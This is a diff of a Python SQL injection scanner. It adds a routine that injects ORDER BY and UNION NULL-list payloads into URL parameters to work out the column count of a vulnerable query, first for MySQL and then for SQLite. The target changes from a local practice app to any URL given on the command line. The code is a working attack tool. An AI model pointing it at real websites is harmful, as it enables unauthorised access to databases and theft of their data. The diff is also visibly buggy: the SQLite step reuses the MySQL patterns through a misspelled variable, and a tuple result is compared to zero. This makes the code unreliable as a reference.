@@ -88,36 +88,69 @@ def parse_sql(url):
     params = parse_qsl(parsed.query, keep_blank_values=True)
     return params
 
-def find_nb_args(url, params):
 
-        working_params = set()
-        injection = "' ORDER BY 1--"
-        for parameter, value in params:
-            pos = get_insertion_position(url, parameter)
-            if pos == None:
-                continue
-            new_url = url[:pos] + injection + url[pos:]
-            try:
-                res = s.get(new_url)
-            except Exception as e:
-                print(f"[!] Failed to get {new_url}: {e}")
-                exit(1)
-            if is_vulnerable_errors(res):
-                working_params.add((parameter, value))
+def find_nb_sql_args(url, params, patterns, max_test=20):
 
-        for parameter, value in working_params:
-            print(f"working params: {parameter}, {value}")
+    max_found = 0
+    max_param = ""
+    max_pattern = ""
 
+    for parameter, value in params:
+
+        pos = get_insertion_position(url, parameter)
+        if pos is None:
+            continue
+
+        for pattern in patterns:
+            for i in range(1, max_test + 1):
+                payload = pattern["payload"]
+                placeholder_type = pattern["placeholder"]
+
+                if placeholder_type == "INT":
+                    replace_with = str(i)
+
+                elif placeholder_type == "NULL_LIST":
+                    replace_with = ",".join(["NULL"] * i)
+
+                injection = payload.replace("#?#", replace_with)
+                new_url = url[:pos] + injection + url[pos:]
+
+                print("[!] trying", new_url)
+
+                try:
+                    res = s.get(new_url)
+                except Exception as e:
+                    print(f"[!] Failed to get {new_url}: {e}")
+                    exit(1)
+
+                if is_vulnerable_errors(res):
+                    found = i - 1
+                    if found > max_found:
+                        max_found = found
+                        max_param = parameter
+                        max_pattern = injection
+                    break
+
+    return max_found, max_param, max_pattern
 
 
 def test_sqli_union(url , params):
-
-        nb_args = find_nb_args(url, params);
+    #MySQL
+    nb_column_patterns = MYSQL_ERROR["nb_column_patterns"]
+    nb_args = find_nb_sql_args(url, params, nb_column_patterns);
+    print(f"mysql nb args for union is: {nb_args}")
+    #SQLite
+    if nb_args != 0:
+        return nb_args
+    nb_colum_patterns = SQLITE_ERROR["nb_column_patterns"]
+    nb_args = find_nb_sql_args(url, params, nb_column_patterns)
+    print(f"sqlite nb args for union is : {nb_args}")
 
 
 def scan_sql_injection(url):
     params = parse_sql(url)
     is_err_injectable = test_sqli_errors(url, params)
+    print(f"end of err test for result {is_err_injectable}")
     if (is_err_injectable):
         #is_bool_injectable = test_sqli_boolean(url, params)
         is_union_injectable = test_sqli_union(url, params)
@@ -176,8 +209,8 @@ def create_session(url, cookies):
     return s
 
 if __name__ == "__main__":
-    url = "http://localhost:4243/vulnerabilities/sqli/?id=1&Submit=Submit#"
     args = parse_arg()
+    url = args.url
     try:
         s = create_session(url, args.C)
     except Exception as e:
